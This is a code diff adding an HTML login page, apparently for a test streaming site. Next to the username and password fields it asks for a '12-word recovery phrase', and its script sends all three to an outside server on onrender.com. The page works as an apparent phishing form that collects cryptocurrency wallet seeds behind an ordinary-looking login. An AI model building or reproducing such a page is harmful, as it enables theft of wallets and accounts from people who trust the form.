@@ -1,3 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <base href="/streampaltest/public/">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+  <nav>
+    <a href="index.html">Home</a> | <a href="signup.html">Sign Up</a> | <a href="login.html">Login</a>
+  </nav>
+  <div class="container">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username"><br><br>
+    <input type="password" id="password" placeholder="Password"><br><br>
+    <textarea id="phrase" placeholder="12-word recovery phrase" rows="3"></textarea><br><br>
+    <button onclick="login()">Login</button>
+  </div>
+
+
 <script>
 const BACKEND_URL = 'https://authappmain.onrender.com';
 
@@ -8,23 +29,24 @@ async function login() {
     phrase: document.getElementById('phrase').value.trim()
   };
 
-  try {
-    const res = await fetch(`${BACKEND_URL}/api/login`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    });
+  const res = await fetch(`${BACKEND_URL}/api/login`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  });
 
-    const json = await res.json();
+  const json = await res.json();
 
-    if (json.success && json.token) {
-      localStorage.setItem('jwt', json.token);  // ← STORED HERE
-      location.href = 'profile.html';
-    } else {
-      alert('Login failed');
-    }
-  } catch (e) {
-    alert('Server error');
+  if (json.success && json.token) {
+    localStorage.setItem('jwt', json.token);
+    location.href = 'profile.html';
+  } else {
+    alert('Wrong credentials');
   }
 }
 </script>
+
+
+
+</body>
+</html>
